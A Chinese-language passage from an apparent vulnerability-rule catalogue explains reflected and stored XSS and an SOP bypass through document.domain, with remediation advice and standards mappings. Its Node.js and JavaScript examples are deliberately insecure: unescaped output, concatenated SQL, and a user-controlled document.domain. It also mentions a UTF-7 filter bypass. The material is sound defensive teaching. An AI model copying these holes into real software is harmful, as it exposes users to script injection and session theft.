<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，编码时这些字符必须被视为合法输入，例如，一个 Web 设计电子公告栏就必须接受其用户提供的 HTML 片段。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－ “&lt;” 是一个特殊字符，因为它可以引入一个标签。</p>
<p>－ “&amp;” 是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－ “&gt;” 是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个 “&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>－ “&amp;” 与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>－ “&amp;” 是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。例如，当输入中出现 “%68%65%6C%6C%6F” 时，只有从输入的内容中过滤掉 “%”，上述字符串才能在网页上显示为 “hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>－ 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者以 UTF-7 格式提交了请求，则特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切指定编码格式的网页中，某些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-21"><a href="#REFERENCES-21" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 SI </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Cross-Site-Scripting-Reflected"><a href="#Cross-Site-Scripting-Reflected" class="headerlink" title="Cross-Site Scripting: Reflected"></a>Cross-Site Scripting: Reflected</h4><h5 id="ABSTRACT-22"><a href="#ABSTRACT-22" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-22"><a href="#EXPLANATION-22" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Reflected XSS，不可信赖的数据源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该数据源通常为数据库或其他后端数据存储。</p>
</li>
<li><p>未经验证但包含在动态内容中的数据将传送给 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例 1：以下 Node.js 代码片段会在 HTTP 请求中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var eid = url.parse(request.url, true)[&apos;query&apos;][&apos;eid&apos;];</span><br><span class="line"></span><br><span class="line">  if (eid !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    response.write(&apos;&lt;p&gt;Welcome, &apos; + eid + &apos;!&lt;/p&gt;&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br></pre></td></tr></table></figure>
<p>如果eid只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果eid中的某个值包含元字符或源代码，则 Web 浏览器就会在显示 HTTP 响应时执行该代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>示例 2：下面的 Node.js 代码片段会根据给定的雇员 ID 查询数据库，并打印相应雇员的姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  connection.query(&apos;SELECT * FROM emp WHERE eid=&quot;&apos; + eid + &apos;&quot;&apos;, function(err, rows)&#123;</span><br><span class="line"></span><br><span class="line">    if (!err &amp;&amp; rows.length &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">      response.write(&apos;&lt;p&gt;Welcome, &apos; + rows[0].name + &apos;!&lt;/p&gt;&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br></pre></td></tr></table></figure>
<p>如同Example 1，如果对name的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的漏洞利用行为无能为力。同样，这段代码看起来似乎危险较小，因为name的值是从数据库中读取的，而且这些内容明显是由应用程序管理的。然而，如果name的值来自用户提供的数据，数据库就会成为恶意内容传播的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的漏洞利用称为 Persistent XSS（或 Stored XSS），它极其隐蔽，因为数据存储导致的间接行为会增大辨别威胁的难度，并使多个用户受此攻击影响的可能性提高。XSS 漏洞利用首先会在网站上为访问者提供一个“留言簿”。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿页面的访问者都会执行这些恶意代码。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<ul>
<li><p>如Example 1中所示，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。</p>
</li>
<li><p>如Example 2中所示，应用程序将危险数据存储在数据库或其他可信赖的数据存储中。这些危险数据随后会被读回到应用程序中，并包含在动态内容中。在以下情况下会发生 Persistent XSS 漏洞利用：攻击者将危险内容注入到数据存储中，而这些危险内容随后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于显示给许多用户或显示给特定相关用户的区域。这些相关用户通常在应用程序中具备较高的特权，或者可以与敏感数据交互，这些数据对攻击者来说具有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人敏感数据的访问权。</p>
</li>
<li><p>应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并储存在动态内容中。</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-22"><a href="#RECOMMENDATIONS-22" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞在应用程序的输出中包含恶意数据时出现，因此，合乎逻辑的方法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，编码时这些字符必须被视为合法输入，例如，一个 Web 设计电子公告栏就必须接受其用户提供的 HTML 片段。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在<code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>－ 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者以 UTF-7 格式提交了请求，则特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切指定编码格式的网页中，某些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-22"><a href="#REFERENCES-22" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 SI </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[25] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[26] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[45] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Cross-Site-Scripting-SOP-Bypass"><a href="#Cross-Site-Scripting-SOP-Bypass" class="headerlink" title="Cross-Site Scripting: SOP Bypass"></a>Cross-Site Scripting: SOP Bypass</h4><h5 id="ABSTRACT-23"><a href="#ABSTRACT-23" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户输入以控制以下设置：确定可创建 XSS 漏洞的同源策略 (SOP)。</p>
<h5 id="EXPLANATION-23"><a href="#EXPLANATION-23" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下，通过同源策略 (SOP) 绕过发生跨站点脚本 (XSS) 漏洞：</p>
<p>1.数据通过一个不可信赖的数据源进入 Web 应用程序。</p>
<p>2.数据将传递到一个设置，该设置确定脚本可以运行的页面源，例如 document.domain。</p>
<p>执行此操作后，将允许另一个域中的攻击者将 document.domain 设置为相同值，并在页面上执行脚本，就像它们位于完全相同的域中一样。</p>
<p>示例 1：下面，我们取一个 URL 参数 domain，并将其作为页面的同源策略 (SOP) 的域传递。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">var pos = document.URL.indexOf(&quot;domain=&quot;)+7;</span><br><span class="line"></span><br><span class="line">document.domain = document.URL.substring(pos,document.URL.length);</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>大多数浏览器只允许将有效的超域传递给document.domain。因此，如果页面位于“<a href="http://www.example.com”，则可以将document.domain设置为“www.example.com”或“example.com”。它不能设置为“com”或“example.org”。" target="_blank" rel="noopener">http://www.example.com”，则可以将document.domain设置为“www.example.com”或“example.com”。它不能设置为“com”或“example.org”。</a></p>
<p>然而，如果攻击者位于他们能够控制的网站的另一部分上，他们也许能够在他们无法控制的网站部分上执行脚本。</p>
<h5 id="RECOMMENDATIONS-23"><a href="#RECOMMENDATIONS-23" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在可能的情况下，决不允许用户输入来控制 document.domain。 </p>
